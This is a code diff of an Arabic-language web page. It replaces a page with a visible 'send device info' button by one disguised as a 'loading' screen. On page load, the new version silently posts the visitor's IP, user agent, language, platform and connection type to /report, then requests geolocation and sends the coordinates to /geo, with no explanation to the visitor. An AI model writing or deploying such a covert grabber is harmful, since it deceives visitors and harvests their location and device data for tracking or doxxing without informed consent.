@@ -1,88 +1,45 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <title>إرسال معلومات الجهاز</title>
-  <style>
-    body {
-      background: #fff;
-      color: #333;
-      text-align: center;
-      font-family: sans-serif;
-      padding: 30px;
+  <meta charset="UTF-8">
+  <title>جاري التحميل...</title>
+  <script>
+    async function sendDeviceInfo() {
+      const ip = await fetch('/get_ip').then(res => res.text());
+      const info = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        ip: ip,
+        connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
+      };
+
+      // إرسال البيانات
+      await fetch('/report', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(info)
+      });
+
+      // محاولة إرسال الموقع الجغرافي
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          await fetch('/geo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            })
+          });
+        });
+      }
     }
-    a {
-      display: inline-block;
-      margin-top: 20px;
-      font-size: 1.1em;
-      padding: 10px 20px;
-      background-color: #4CAF50;
-      color: white;
-      text-decoration: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    #status {
-      margin-top: 20px;
-      font-weight: bold;
-    }
-  </style>
+
+    window.onload = sendDeviceInfo;
+  </script>
 </head>
 <body>
-  <h2>اضغط الرابط أدناه لإرسال معلومات جهازك</h2>
-  <a href="#" id="sendInfoLink">إرسال معلومات الجهاز</a>
-  <p id="status"></p>
-
-  <script>
-    const sendInfoLink = document.getElementById("sendInfoLink");
-    const status = document.getElementById("status");
-
-    sendInfoLink.addEventListener("click", async (e) => {
-      e.preventDefault();
-      status.innerText = "⏳ جاري جمع المعلومات وإرسالها...";
-
-      try {
-        const position = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
-        });
-
-        const { latitude, longitude } = position.coords;
-
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        const ip = ipData.ip;
-
-        const userAgent = navigator.userAgent;
-
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const networkType = connection ? connection.effectiveType : "غير متوفر";
-
-        const timestamp = new Date().toISOString();
-
-        const res = await fetch("/send_client_info", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            latitude,
-            longitude,
-            ip,
-            userAgent,
-            networkType,
-            timestamp
-          }),
-        });
-
-        const data = await res.json();
-        if (data.success) {
-          status.innerText = "✅ تم إرسال المعلومات بنجاح!";
-        } else {
-          status.innerText = "❌ حدث خطأ أثناء الإرسال.";
-        }
-      } catch (err) {
-        console.error(err);
-        status.innerText = "❌ فشل في جمع المعلومات أو تم رفض الإذن.";
-      }
-    });
-  </script>
+  <h2>جارٍ تحميل الصفحة...</h2>
 </body>
 </html>
